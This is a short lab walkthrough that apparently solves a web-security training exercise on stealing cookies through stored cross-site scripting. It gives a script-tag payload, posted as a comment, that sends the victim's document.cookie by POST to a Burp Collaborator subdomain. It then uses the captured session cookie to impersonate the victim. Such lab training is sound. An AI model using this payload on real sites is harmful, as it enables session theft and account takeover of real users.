# Lab: Exploiting cross-site scripting to steal cookies

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/a0afb93c-f722-49d5-9595-30eefa78e77b)

## Solution

Go to burp collaborator, start it and click on **Copy to clipboard** to get a subdomain.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/d7bb04d0-34b5-475b-9643-b93882161a25)

Use the following script and post it as a comment.

```Javascript
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

- `fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { ... }) ` initiates a network request to the specified URL `(https://BURP-COLLABORATOR-SUBDOMAIN)`.

- `{ method: 'POST', mode: 'no-cors', body: document.cookie } ` specifies the options for the fetch request:
  - `method: 'POST'`: This indicates that the request will be sent using the HTTP POST method.
  - `mode: 'no-cors'`: This sets the request mode to 'no-cors', which means that the browser will make the request without including the CORS (Cross-Origin Resource Sharing) headers. This mode restricts the type of responses that can be received.
  - `body: document.cookie`: This assigns the value of document.cookie as the request body. document.cookie contains all the cookies associated with the current domain, including session cookies and other sensitive information.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/383327dd-6d00-441a-b025-2c9468d3a4be)

In burp collaborator, the cookie of the victim can be seen as request in **HTTP** type.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/ab96562f-a57d-4b83-a829-dfb5872b3bbf)

Use the above acquired victim's cookie instead of our own to impersonate the victim and solve the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/a24a368e-6e62-4931-b37d-fa177e1a770c)
